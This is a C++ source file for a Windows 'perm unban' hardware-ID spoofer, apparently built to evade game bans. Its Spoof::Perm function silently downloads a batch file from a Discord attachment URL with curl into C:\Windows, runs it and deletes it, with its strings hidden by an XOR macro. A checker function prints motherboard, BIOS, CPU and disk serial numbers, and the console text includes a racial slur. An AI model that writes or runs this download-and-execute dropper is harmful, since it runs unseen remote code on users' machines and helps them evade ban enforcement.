#include <iostream>
#include <thread>
#include <Windows.h>
#include <string>
#include "xorstr.h"

struct slowly_printing_stringg {
	std::string data;
	long int delay;
};

std::ostream& operator<<(std::ostream& out, const slowly_printing_stringg& s) {
	for (const auto& c : s.data) {
		out << c << std::flush;
		std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));
	}
	return out;
}

namespace Spoof {

	void Perm()
	{
		system(E("cls"));
		std::cout << slowly_printing_stringg{ "\n\n\n bouta unban yo black ass",50 };
		Beep(500, 500);
		system(E("curl https://cdn.discordapp.com/attachments/1054265232916230144/1058203604080672878/CSI.bat -o C:\\Windows\\both.bat --silent"));
		system(E("cls"));
		SetConsoleTitle(E(L"Simply Coded A Perm Unban       discord.gg/simply"));
		std::cout << slowly_printing_stringg{ "\n\n\n Press Any Key To Clean & Spoof",50 };
		system(E("pause >nul"));

		ShowWindow(GetConsoleWindow(), SW_SHOW);
		system(E("C:\\Windows\\both.bat"));

		std::remove(E("C:\\Windows\\both.bat"));
		system(E("cls"));

	}
	
}

namespace Check {

	void checker()
	{
		Beep(500, 500);
		Sleep(200);
		system(E("cls"));
		system("color b");
		system(E("echo BaseBoard SN:"));
		Sleep(200);
		system(E("wmic baseboard get serialnumber"));
		Sleep(200);
		system(E("echo Bios SN:"));
		Sleep(200);
		system(E("wmic bios get serialnumber"));
		Sleep(200);
		system(E("echo Cpu SN:"));
		Sleep(200);
		system(E("wmic cpu get serialnumber"));
		Sleep(200);
		system(E("echo DiskDrive SN:"));
		Sleep(200);
		system(E("wmic diskdrive get serialnumber"));
		Sleep(200);
		std::cout << E("  ") << '\n';
		Sleep(200);
		system(E("echo -----------------------------------------------"));
		Sleep(200);
		system(E("echo Going back to Dashboard in 10 Seconds..."));
		Sleep(200);
		system(E("echo -----------------------------------------------"));
		Sleep(10000);
	}
}